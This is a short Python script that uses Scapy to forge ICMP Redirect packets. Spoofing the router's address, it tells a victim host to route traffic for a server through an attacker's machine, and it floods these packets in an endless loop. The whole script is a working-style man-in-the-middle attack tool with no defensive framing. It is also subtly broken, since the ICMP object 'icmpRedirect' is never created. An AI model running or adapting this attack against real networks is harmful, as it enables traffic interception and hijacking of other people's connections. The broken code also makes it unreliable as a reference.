from scapy.all import * 

originalRouterIP = '10.10.10.1'
attackerIP = '10.10.10.12'
victimIP = '10.10.10.11'
serverIP = '10.10.20.2'

# Here we create an ICMP Redirect packet
ip = IP()
ip.src = originalRouterIP
ip.dst = victimIP
icmpRedirect.type = 5 
icmpRedirect.code = 1
icmpRedirect.gw = attackerIP

# The ICMP packet payload /should/ :) contain the original TCP SYN packet
# sent from the victimIP

redirPayloadIP = IP()
redirPayloadIP.src = victimIP
redirPayloadIP.dst = serverIP
fakeOriginalTCPSYN = TCP()
fakeOriginalTCPSYN.flags = 'S'
fakeOriginalTCPSYN.dport = 80
fakeOriginalTCPSYN.seq = 444444444
fakeOriginalTCPSYN.sport = 55555

# Release the Kraken!
while True:
    send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)